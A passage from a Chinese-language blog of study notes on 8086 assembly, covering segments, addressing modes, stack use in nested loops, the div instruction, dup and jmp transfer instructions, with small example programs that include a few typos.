class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:b,ds:a,ss:c</span><br><span class=\"line\">....</span><br><span class=\"line\">b segment</span><br><span class=\"line\">d:\tmov ax,c</span><br><span class=\"line\">\tmov ss,ax</span><br><span class=\"line\">\tmov sp,20h   ;将c当做栈空间，ss:sp指向c:20</span><br></pre></td></tr></table></figure>\n<p>程序占 N 个字节，运行后，该端实际占有空间为 (段为 16 的倍数)</p>\n<p>(N/16+1)*16</p>\n<p>如果没有 end 后面的标号，CPU 会将第一个数据当做代码段的开始</p>\n<p>程序如下，编写 code 段中的代码，将 a 段和 b 段中的数据依次相加，将结果存到 c 段中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">a segment</span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">a ends</span><br><span class=\"line\"></span><br><span class=\"line\">b segment </span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">b ends</span><br><span class=\"line\"></span><br><span class=\"line\">c segment</span><br><span class=\"line\">\tdb 0,0,0,0,0,0,0,0</span><br><span class=\"line\">c ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,a</span><br><span class=\"line\">\t\tmov ds,ax   ;ds中为数据段a中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,c</span><br><span class=\"line\">\t\tmov es,ax   ;es中为数据段c中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t </span><br><span class=\"line\">s:\t\tmov dx,ds:[bx]   ;循环将ds(a)中的数据给c</span><br><span class=\"line\">\t\tmov es:[bx],dx   </span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,b</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov dx,ds:[bx]</span><br><span class=\"line\">\t\tadd es:[bx],dx</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221019214952321.png\" alt=\"image-20221019214952321\"></p>\n<h2 id=\"更灵活定位内存地址\"><a class=\"markdownIt-Anchor\" href=\"#更灵活定位内存地址\">#</a> 更灵活定位内存地址</h2>\n<p>and 逻辑与，按位进行与运算，通过该指令可以将操作对象响应为设为 0，只要和 0 and</p>\n<p>or 逻辑或，按位进行或运算，通过该指令可以将操作对象相应位设为 0，只要和 1 or</p>\n<p>通过’  ’ 括起来标识一个字符</p>\n<p>db ‘unIX’  相当于 db 75H,6Eh,49H,58H   define byte</p>\n<p>mov al,‘a’  相当于 mov al,61H</p>\n<p>通过 将第五位二进制数和 0 与变为大写</p>\n<p>[bx+idata] 表名一个内存单元，偏移地址为 idata</p>\n<p>mov ax,[200+bx]</p>\n<p>mov ax,[bx+200]</p>\n<p>mov ax,200[bx]</p>\n<p>mov ax,[bx].200</p>\n<p>以上四个写法等效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,5</span><br><span class=\"line\">s:\t\tmov al,[bx]</span><br><span class=\"line\">\t\tand al,11011111b</span><br><span class=\"line\">\t\tmov [bx],al</span><br><span class=\"line\">\t\tmov al,[5+bx]</span><br><span class=\"line\">\t\tor al,00100000b</span><br><span class=\"line\">\t\tmov [5+bx],al</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br></pre></td></tr></table></figure>\n<p>SI,DI</p>\n<p>和 bx 功能相近，但不能分成两个八位寄存器使用</p>\n<p>mov ax,[bx]</p>\n<p>mov ax,[si]</p>\n<p>mov ax,[di]</p>\n<p>一般用 si 指向原始空间，di 指向目标空间</p>\n<p>mov ax,[bx+si]  == mov ax,[bx][si]</p>\n<p>[bx+si+idata] == mov ax,idata[bx][si]  ==  mov ax,[bx][si].200  == mov ax,[bx].200[si]</p>\n<p>将 db 中的每个字母第一个变为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;1.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;2.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;3.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;4.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;5.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;6.file       &#x27;</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,6</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tmov al,[bx+3]</span><br><span class=\"line\">\t\tand al,11011111b</span><br><span class=\"line\">\t\tmov [bx+3],al</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 datasg 的每个字母变为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov ax,cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tmov cx,ax</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>这样做 cx 不会被覆盖导致死循环，进入循环前先保存起来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov ds:[40H],cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tmov cx,ds:[40H]</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 cx 放在内存中来解决寄存器不够的问题</p>\n<p>更好的办法是使用栈，在调用函数前 push 到栈中，调用结束后 pop 回内存中，防止因为调用函数导致寄存器被篡改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">stacksg segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stacksg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov ax,stacksg</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16</span><br><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpush cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 datasg 段中每个单词的前四个字改为大写字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;1. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;2. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;3. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;4. display       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">stacksg segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stacksg ends</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov ax,stacksg</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16 ;定位栈段</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax  ;定位内存</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4  ;循环条件，bx偏移地址，cx循环条件，因为有四条字母，所以四次循环</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpush cx   ;外层循环，用户列循环，将cx入栈保证cx不受后续内层循环干扰</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,4  ;内层循环，因为大写前四个字母，循环四次</span><br><span class=\"line\">s:\t\tmov al,[bx+3+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+3+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据处理的问题\"><a class=\"markdownIt-Anchor\" href=\"#数据处理的问题\">#</a> 数据处理的问题</h2>\n<p>reg 和 sreg  寄存器，段寄存器</p>\n<p>只有四个寄存器 bx,bp,si,di 可以用在 [] 中进行内存单元的寻址，可以单个出现或四种组合出现</p>\n<p>注意: mov ax [bp+bx]   mov ax,[si+di] 不能一起使用</p>\n<p>bp 如果没有显示指定段地址，那么段地址默认在 ss 中，可以简单理解为 sp</p>\n<p>mov ax,[bp]</p>\n<p>mov ax,[bp+si]</p>\n<p>mov ax,[bp+idata]</p>\n<p>汇编语句用三个概念来表达数据的位置</p>\n<p>1. 立即数</p>\n<p>2. 寄存器</p>\n<p>3. 段地址 (SA)，偏移地址 (EA)</p>\n<p>段地址寄存器默认</p>\n<p>mov ax,[0]   //==mov ax,ds:[0] , 注意，只有 0 能这么搞，其他的数字会被当成立即数处理，不会被当场偏移地址处理</p>\n<p>mov ax,[bx+si]</p>\n<p>mov ax,[bp]    // 段地址默认在 ss 中</p>\n<p>段地址寄存器显示指出</p>\n<p>mov ax,ds:[bp]</p>\n<p>mov ax,cs:[bx+si+8]  // 显示指出可以随便给，默认指出就给 ss</p>\n<p>寻址方式</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022185518717.png\" alt=\"image-20221022185518717\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022191402201.png\" alt=\"image-20221022191402201\" style=\"zoom:67%;\" />\n<blockquote>\n<p>1. 将 cs：ip 通过地址加法器，算出一个 20 位的地址，通过地址总线，送到内存中，在内存中找到对应的位置</p>\n<p>2. 将 1 找到的内存的数据，比如 A10E00 通过数据总线，送到指令缓冲寄存器中</p>\n<p>3. 执行指令</p>\n<p>4. 将所有偏移地址送到地址加法器中算出一个偏移地址，通过地址总线送到内存中</p>\n<p>5. 将 4 中的数据，比如 A10E 通过数据总线，送给对应寄存器</p>\n<p>6.IP 指向下一条指令</p>\n</blockquote>\n<p>确定要处理的数据有多长</p>\n<p>1. 通过寄存器名指明数据大小 mov ax,1 这时 1 就是 16 位的，因为 ax 也是 16 位的    mov ax,ds:[0]  这时候 ds 偏移地址中数据也是八位的</p>\n<p>2. 通过操作符 x ptr 指明内存单元长度，x 可以为 word 或 byte，可以理解为强制转换法</p>\n<blockquote>\n<p>mov word ptr ds:[0],1     // 这时 16 位的，0001H</p>\n<p>inc word ptr [bx],2</p>\n<p>mov byte ptr ds:[0],1  // 这时 8 位的，01H</p>\n<p>double word ptr 双字</p>\n</blockquote>\n<p>3. 其他方法 push [1000H] 入栈，push 指令只对字进行操作 sp=sp-2</p>\n<p>用 bx 定位整个结构体，用 idata 定位结构体中的某一个数据项，用 si 定位数组项中的每个元素。</p>\n<p>[bx].idata</p>\n<p>[bx].idata[si]</p>\n<p>div</p>\n<p>除数 8/16 位，被除数默认放在 ax,dx 和 ax 中</p>\n<p>如果除数为 8 位，被除数需要 16 位 (ax)</p>\n<p>如果除数为 16 位，被除数需要 32 位 (ax+dx),dx 是高位，ax 是低位</p>\n<p>除数是 8 位的时候，商在 al 中，余数在 ah 中</p>\n<p>除数是 16 位的时候，商在 ax 中，余数在 dx 中</p>\n<p>div 寄存器</p>\n<p>div 内存单元</p>\n<p>div btye ptr ds:[0]   // <code>(al)=(ax)/((ds)*16+0)的商，(ah)=(ax)/((ds)*16+0)的余数</code></p>\n<p>div word ptr es:[0]  // <code>(ax)=[(dx)*10000H+(ax)]/((ds)*16+0)的商，(dx)=[(dx)*10000H+(ax)]/((ds)*16)+0的余数</code></p>\n<p>10001/100</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dx,1</span><br><span class=\"line\">mov ax,86a1</span><br><span class=\"line\">mov bx,100</span><br><span class=\"line\">div bx</span><br></pre></td></tr></table></figure>\n<p>1001/100</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,1001</span><br><span class=\"line\">mob bl,100</span><br><span class=\"line\">div bl</span><br></pre></td></tr></table></figure>\n<p>dd 定义双字</p>\n<p>用 div 计第 data 段中第一个数据除以第二个数据后的结果・商存放在第 3 个数据的存储单元。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data</span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdd 100001</span><br><span class=\"line\">\tdw 100</span><br><span class=\"line\">\tdw 0</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,data\t</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov ax,ds:[0]</span><br><span class=\"line\">\t\tmov dx,ds:[2]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tdiv word ptr ds:[4]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ds:[6],ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>dup</p>\n<p>db 3 dup (0)   定义 3byte，他们值都是 0</p>\n<p>db 3 dup(0,1,2)  //0,1,2,0,1,2,0,1,2</p>\n<p>db 3 dup(‘abc’,‘ABC’)  //abcABCabcABCabcABC</p>\n<p>db/dw/dd n dup()</p>\n<h2 id=\"转移指令\"><a class=\"markdownIt-Anchor\" href=\"#转移指令\">#</a> 转移指令</h2>\n<p>8086 转移指令分为：</p>\n<p>8086CPU 的转移行为有以下几类。</p>\n<blockquote>\n<p>1. 无条件转移</p>\n<p>2. 条件转移指令</p>\n<p>3. 循环指令</p>\n<p>4. 过程</p>\n<p>5. 中断</p>\n</blockquote>\n<ol>\n<li></li>\n</ol>\n<p>jmp 无条件跳转</p>\n<p>只修改 IP 时，称为段内转移，比如: jmp ax。</p>\n<p>同时修改 CS 和 IP 时，称为段间转移，比如: jmp 1000:0。</p>\n<p>由于转移指令对 IP 的修改范围不同，段内转移又分为：短转移和近转移。</p>\n<p>短转移 IP 的修改范围为 - 128~127。</p>\n<p>近转移 IP 的修改范围为 - 32768~32767。</p>\n<p>操作符 offset</p>\n<p>取得标号的偏移地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start:\tmov ax,offset start   ;mov ax,0</span><br><span class=\"line\">s:\t\tmov ax,offset s\t\t  ;mov ax,3</span><br></pre></td></tr></table></figure>\n<p>jmp 指令</p>\n<p><code>jmp short 标号</code>   ；转移到标号处执行指令是种短转移，修改 IP 范围为 - 128-127</p>\n<p>然鹅，jmp 0008 的机器码为 EB 03，0008 为需要跳转的命令地址</p>\n<p>jmp 000A   EB 05</p>\n<p>CPU 不需要目的地址就可以实现对 IP 的修改</p>\n<p>EB 后面的数字实际是个 offset，说明目的指令离 jmp 五个字节</p>\n<p><code>jmp near ptr 标号 </code>  , 用于实现段内近转移位移范围 - 32769-32767</p>\n<p><code>jmp far ptr 标号</code>      // 段间转移，远转移</p>\n<p>far ptr 指明了格用标号的段地址和偏移地址修改 CS 和 IP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221024210038120.png\" alt=\"image-20221024210038120\"></p>\n<p>此时机器码为跳转的地址，IP 在前，CS 在后</p>\n<p><code>jmp 16位寄存器</code></p>\n<p>jmp ax     // 实现段内近 / 短转移，ax 中为 ip 的值</p>\n<p>转移地址在内存中：</p>\n<p><code>jmp word ptr 内存单元地址</code>     // 实现内存单元地址的段内转移，内存单元地址是目的地址</p>\n<p>jmp word ptr ds:[0]</p>\n<p>jmp word ptr 